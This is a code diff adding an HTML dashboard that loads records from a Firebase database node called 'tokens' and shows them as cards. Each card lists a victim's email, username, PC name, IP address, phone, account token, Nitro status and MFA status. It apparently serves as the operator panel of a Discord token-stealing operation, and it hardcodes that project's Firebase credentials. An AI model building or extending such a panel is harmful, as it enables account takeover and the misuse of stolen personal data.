@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tokens Display</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: radial-gradient(circle, rgba(0, 0, 0, 1) 0%, rgba(0, 255, 255, 1) 100%);
+      margin: 0;
+      padding: 0;
+      color: white;
+    }
+
+    h1 {
+      font-size: 48px;
+      text-align: center;
+      margin-top: 50px;
+      color: #00e5ff;
+      text-shadow: 0 0 10px rgba(0, 255, 255, 0.7), 0 0 20px rgba(0, 255, 255, 0.5), 0 0 30px rgba(0, 255, 255, 0.3);
+    }
+
+    .token-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .token-card {
+      background-color: rgba(0, 0, 0, 0.6);
+      border-radius: 12px;
+      padding: 20px;
+      width: 250px;
+      box-shadow: 0 4px 20px rgba(0, 255, 255, 0.5);
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .token-card:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 40px rgba(0, 255, 255, 0.6);
+    }
+
+    .token-card h2 {
+      font-size: 20px;
+      color: #00e5ff;
+      text-transform: uppercase;
+      margin: 0;
+      font-weight: bold;
+      text-shadow: 0 0 10px rgba(0, 255, 255, 0.7), 0 0 20px rgba(0, 255, 255, 0.5);
+    }
+
+    .token-card p {
+      font-size: 14px;
+      color: #b3e5fc;
+      margin: 8px 0;
+      text-shadow: 0 0 5px rgba(0, 255, 255, 0.6);
+    }
+
+    .loading {
+      text-align: center;
+      font-size: 18px;
+      color: #ffffff;
+      padding-top: 20px;
+    }
+
+    .details {
+      display: none;
+      font-size: 14px;
+      margin-top: 15px;
+      color: #eeeeee;
+      text-align: left;
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 10px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+    }
+
+    .btn-view {
+      background-color: #00e5ff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+      font-size: 14px;
+      border-radius: 8px;
+      transition: background-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+      text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
+    }
+
+    .btn-view:hover {
+      background-color: #00bcd4;
+      box-shadow: 0 0 10px rgba(0, 255, 255, 0.7);
+    }
+
+    .btn-view:focus {
+      outline: none;
+    }
+
+    .token-card:before {
+      content: '';
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      background: rgba(0, 255, 255, 0.2);
+      border-radius: 12px;
+      z-index: -1;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.4);
+    }
+  </style>
+</head>
+<body>
+  <h1>Tokens from Firebase</h1>
+  <div id="loading" class="loading">Loading tokens...</div>
+  <div id="tokenContainer" class="token-container"></div>
+
+  <script type="module">
+    // Import the Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
+    import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-database.js";
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyCUUabZ_pDb0C1dezzuyBVzP6Ut7XpWo0s",
+      authDomain: "form-e74ab.firebaseapp.com",
+      databaseURL: "https://form-e74ab-default-rtdb.firebaseio.com",
+      projectId: "form-e74ab",
+      storageBucket: "form-e74ab.appspot.com",
+      messagingSenderId: "93811294360",
+      appId: "1:93811294360:web:6bfcd40b7a4fe2524cd0ed",
+      measurementId: "G-GV55PBD71V"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    // Reference to the tokens node in the database
+    const tokensRef = ref(database, 'tokens');
+
+    // Fetch and display tokens data from Firebase
+    async function displayTokens() {
+      const tokenContainer = document.getElementById("tokenContainer");
+      const loading = document.getElementById("loading");
+
+      try {
+        const snapshot = await get(tokensRef);
+
+        if (snapshot.exists()) {
+          loading.style.display = "none"; // Hide loading message
+          const tokens = snapshot.val();
+          for (const tokenId in tokens) {
+            const token = tokens[tokenId];
+            const tokenCard = document.createElement("div");
+            tokenCard.className = "token-card";
+
+            const tokenTitle = document.createElement("h2");
+            tokenTitle.textContent = `Token ID: ${tokenId}`;
+
+            const viewButton = document.createElement("button");
+            viewButton.className = "btn-view";
+            viewButton.textContent = "View Content";
+            viewButton.addEventListener("click", () => {
+              const details = tokenCard.querySelector(".details");
+              details.style.display = details.style.display === "none" ? "block" : "none";
+            });
+
+            const detailsDiv = document.createElement("div");
+            detailsDiv.className = "details";
+            detailsDiv.innerHTML = `
+              <p><strong>Email:</strong> ${token.email}</p>
+              <p><strong>Username:</strong> ${token.username}</p>
+              <p><strong>Platform:</strong> ${token.platform}</p>
+              <p><strong>PC Name:</strong> ${token.pc_name}</p>
+              <p><strong>IP Address:</strong> ${token.ip}</p>
+              <p><strong>Phone:</strong> ${token.phone}</p>
+              <p><strong>Token:</strong> ${token.token}</p>
+              <p><strong>Days Left:</strong> ${token.days_left}</p>
+              <p><strong>Has Nitro:</strong> ${token.has_nitro ? 'Yes' : 'No'}</p>
+              <p><strong>MFA Enabled:</strong> ${token.mfa_enabled ? 'Yes' : 'No'}</p>
+            `;
+
+            tokenCard.appendChild(tokenTitle);
+            tokenCard.appendChild(viewButton);
+            tokenCard.appendChild(detailsDiv);
+            tokenContainer.appendChild(tokenCard);
+          }
+        } else {
+          loading.textContent = "No tokens found in the database.";
+        }
+      } catch (error) {
+        loading.textContent = "Error loading data from Firebase.";
+        console.error(error);
+      }
+    }
+
+    // Call the function to display tokens on page load
+    displayTokens();
+  </script>
+</body>
+</html>
